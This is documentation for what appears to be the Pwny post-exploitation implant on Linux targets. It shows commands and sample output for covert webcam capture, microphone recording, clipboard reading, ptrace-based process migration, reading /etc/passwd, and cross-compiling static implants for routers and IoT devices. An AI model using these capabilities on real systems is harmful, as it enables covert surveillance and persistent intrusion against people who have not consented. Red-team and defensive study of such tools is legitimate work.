# Linux — Pwny Documentation

This section covers everything specific to running Pwny on **Linux** targets: platform-specific commands, building for multiple architectures, and Linux-specific capabilities.

---

## Table of Contents

- [Linux-Specific Commands](#linux-specific-commands)
  - [cam — Camera Capture (V4L2)](#cam--camera-capture-v4l2)
  - [clipboard — X11 Clipboard](#clipboard--x11-clipboard)
  - [mic — Microphone Recording](#mic--microphone-recording)
  - [migrate — Process Migration](#migrate--process-migration)
- [Plugin System on Linux](#plugin-system-on-linux)
- [Building for Linux](#building-for-linux)
- [Supported Architectures](#supported-architectures)
- [Cross-Compilation](#cross-compilation)

---

## Linux-Specific Commands

### `cam` — Camera Capture (V4L2)

Capture from Video4Linux2 camera devices.

**List cameras:**
```
pwny:/$ cam -l
Camera Devices
==============

 ID  Name
 --  ----
 0   /dev/video0
```

**Take a snapshot:**
```
pwny:/$ cam -s 0 -o /tmp/webcam.jpg
[+] Snapshot saved to /tmp/webcam.jpg
```

**Stream camera feed:**
```
pwny:/$ cam -S 0
[*] Streaming from /dev/video0... Press Ctrl+C to stop.
```

---

### `clipboard` — X11 Clipboard

Read and write clipboard contents on X11 desktops.

```
pwny:/$ clipboard -g
[i] Clipboard content: copied text here

pwny:/$ clipboard -s "new content"
[+] Clipboard set.
```

> **Note:** Requires an active X11 session. Will not work on headless servers without a display.

---

### `mic` — Microphone Recording

Record audio from system microphones.

**List devices:**
```
pwny:/$ mic -l
Microphone Devices
==================

 ID  Name
 --  ----
 0   default
 1   HDA Intel PCH: ALC1220
```

**Record audio:**
```
pwny:/$ mic -S 0 -o /tmp/recording.wav
[*] Recording from device 0... Press Ctrl+C to stop.
[+] Audio saved to /tmp/recording.wav
```

**Record for specified duration (seconds):**
```
pwny:/$ mic -S 0 -o /tmp/recording.wav -d 30
[*] Recording 30 seconds from device 0...
[+] Audio saved to /tmp/recording.wav
```

---

### `migrate` — Process Migration

Migrate the current session into another process using `libinjector`.

```
pwny:/$ migrate 1234
[*] Migrating to 1234 from 5678...
[*] Loading shared library (204800 bytes)...
[*] Sending implant (245760 bytes)...
[*] Waiting for process to rise...
```

Migration uses ptrace-based injection on Linux. Requirements:
- Target process must be accessible (same user or root)
- `ptrace` must not be restricted by Yama (`/proc/sys/kernel/yama/ptrace_scope`)
- If `ptrace_scope` is `1`, you can only migrate to child processes unless running as root

**Check ptrace scope:**
```
pwny:/$ cat /proc/sys/kernel/yama/ptrace_scope
1
```

---

## Plugin System on Linux

Linux plugins use the **POSIX pipe IPC** mechanism:

1. Plugins are built as shared libraries (`.so`)
2. A named pipe is created for IPC between the plugin and the implant
3. Communication uses the same TLV protocol as all other Pwny channels

The plugin system on Linux currently keeps most capabilities built into the implant directly rather than loaded as separate plugins.

### Available Linux Plugins

Plugins are loaded from `pwny/tabs/linux/<arch>/`:

```
pwny:/$ list
Available plugins
=================

 Name       Architecture   Description
 ----       ------------   -----------
 (platform-specific plugins listed here)
```

---

## Building for Linux

### Native Build

```bash
# Build dependencies
make

# Build implant
cmake -DMAIN=ON -B build
cmake --build build

# Build with plugins
cmake -DMAIN=ON -DPLUGINS=ON -B build
cmake --build build
```

### Build Artifacts

| File | Description |
|------|-------------|
| `build/pwny` | Main implant ELF binary (statically linked with musl) |
| `build/libpwny.so` | Shared library for migration |
| `pwny/tabs/linux/<arch>/*` | Plugin shared libraries |

---

## Supported Architectures

Linux supports the widest range of architectures via musl cross-compilation:

| Target | Triple | Use Case |
|--------|--------|----------|
| x86_64 | `x86_64-linux-musl` | Standard servers & desktops |
| i486 | `i486-linux-musl` | Legacy 32-bit systems |
| ARM hard-float | `armv5l-linux-musleabihf` | Raspberry Pi, IoT |
| AArch64 | `aarch64-linux-musl` | ARM64 servers, modern SBCs |
| MIPS | `mips-linux-musl` | Routers, embedded |
| MIPSel | `mipsel-linux-musl` | Little-endian MIPS |
| MIPS64 | `mips64-linux-musl` | 64-bit MIPS |
| PowerPC | `powerpc-linux-musl` | Older Apple, IBM |
| PowerPC64 LE | `powerpc64le-linux-musl` | IBM POWER8+ |
| s390x | `s390x-linux-musl` | IBM Z mainframes |

All Linux builds use **musl libc** for static linking, producing fully self-contained binaries with zero runtime dependencies.

---

## Cross-Compilation

### Install Cross-Compilers

The `cross.sh` script automates musl cross-compiler installation:

```bash
# Install specific target
bash scripts/cross.sh aarch64-linux-musl

# The script downloads pre-built musl cross toolchains from musl.cc
```

### Cross-Build Example

```bash
# Build for AArch64
make TARGET=aarch64-linux-musl
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/aarch64-linux-musl.cmake \
      -DMAIN=ON -B build
cmake --build build
```

### Build All Targets

Use `build-linux.sh` to build for all supported architectures at once:

```bash
bash scripts/build-linux.sh
```

This iterates through all 10 targets, installs cross-compilers as needed, builds dependencies and implants for each.

---

## Linux-Specific Notes

### Static Linking

All Linux implants are statically linked against musl libc. This means:
- **No shared library dependencies** — runs on any Linux distribution
- **No glibc version issues** — works on old and new kernels alike
- **Small binary size** — musl is much smaller than glibc

### Filesystem Paths

The implant uses `/` as the root. All cross-platform commands work with standard POSIX paths:
```
pwny:/$ cd /etc
pwny:/etc$ cat passwd
pwny:/etc$ cd /home/user
```

### Process Information

`ps` and related commands use `/proc` filesystem for process enumeration:
```
pwny:/$ ps
PID    PPID    Name           User
---    ----    ----           ----
1      0       systemd        root
234    1       sshd           root
1234   234     bash           user
...
```

---

## See Also

- [Commands Reference](../commands.md) — cross-platform commands
- [Console Features](../console.md) — prompt, banners, environment
- [Plugin Development](../plugin-development.md) — writing your own plugins
- [Building Guide](../building.md) — full build instructions
